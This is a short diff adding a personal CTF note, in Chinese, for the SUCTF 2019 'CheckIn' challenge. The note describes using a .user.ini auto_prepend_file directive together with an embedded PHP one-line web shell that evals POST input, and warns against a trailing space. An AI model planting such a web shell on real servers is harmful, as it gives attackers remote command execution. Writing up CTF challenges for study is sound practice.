@@ -505,3 +505,10 @@ Warning: system() has been disabled for security reasons
 
 # SUCTF 2019【CheckIn】
 
+又踩个大坑：
+.user.ini文件中
+```ini
+auto_prepend_file= .user.ini 
+#<?php @eval('$_POST["cmd"]');>  
+```
+auto_prepend_file后面一定不要加空格.......
